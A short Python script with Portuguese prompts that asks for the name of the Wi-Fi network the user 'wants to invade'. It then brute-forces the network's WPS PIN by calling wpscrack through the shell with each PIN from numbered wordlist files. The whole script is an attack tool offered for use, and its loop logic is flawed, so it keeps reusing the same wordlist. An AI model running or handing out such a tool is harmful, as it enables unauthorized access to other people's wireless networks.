import time
import os
import netifaces
import subprocess

os.system("clear")
def get_wifi_interface():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if "wlan" in interface:
            return interface
    return None
wifi_interface = get_wifi_interface()
time.sleep(1)
if wifi_interface:
    print(f"Nome da interface Wi-Fi: {wifi_interface} (coloque a baixo)")
else:
    print("Nenhuma interface Wi-Fi encontrada.")
time.sleep(1)
print("[1] 10M - 15M  [10] 55M - 60M")
print("[2] 15M - 20M  [11] 60M - 65M")
print("[3] 20M - 25M  [12] 65M - 70M")
print("[4] 25M - 30M  [13] 70M - 75M")
print("[5] 30M - 35M  [14] 75M - 80M")
print("[6] 35M - 40M  [15] 80M - 85M")
print("[7] 40M - 45M  [16] 85M - 90M")
print("[8] 45M - 50M  [17] 90M - 99M")
print("[9] 50M - 55M")
print("Digite onde você deseja começar.")
n=int(input("[~] "))
s=str(n)
ssid = input("Qual o nome da rede que deseja invadir? ")
while True:
    pins_file = "wordlistofc"+s+".txt"
    def connect_wifi(pin):
        command = f"wpscrack -i {wifi_interface} -s {ssid} -p {pin}"
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        return output.stdout

    def main():
        with open(pins_file, "r") as file:
            pins = file.readlines()
            for pin in pins:
                pin = pin.strip()
                print(f"Testando PIN: {pin}")
                result = connect_wifi(pin)
                if "SUCCESS" in result:
                    print(f"Successo! PIN: {pin}")
                    exit()
                else:
                    print("PIN inválido")

    if __name__ == "__main__":
        main()
        n=n+1
